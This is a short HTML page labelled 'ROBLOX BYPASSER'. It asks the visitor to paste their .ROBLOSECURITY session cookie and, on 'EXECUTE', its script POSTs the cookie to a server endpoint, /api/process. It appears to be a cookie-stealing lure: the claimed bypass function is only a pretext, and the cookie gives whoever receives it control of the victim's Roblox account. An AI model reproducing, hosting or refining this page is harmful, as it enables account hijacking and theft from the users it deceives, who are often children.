<!DOCTYPE html>
<html>
<head>
    <style>
        body { background: #000; color: #fff; display: flex; justify-content: center; padding-top: 100px; }
        .box { width: 300px; background: #111; padding: 20px; border: 1px solid #333; }
        input, button { width: 100%; margin: 10px 0; padding: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>ROBLOX BYPASSER</h2>
        <input id="c" placeholder=".ROBLOSECURITY">
        <button onclick="run()">EXECUTE</button>
        <p id="res"></p>
    </div>
    <script>
        async function run() {
            const cookie = document.getElementById('c').value;
            const res = await fetch('/api/process', {
                method: 'POST',
                body: JSON.stringify({ cookie })
            });
            const data = await res.json();
            document.getElementById('res').innerText = JSON.stringify(data);
        }
    </script>
</body>
</html>
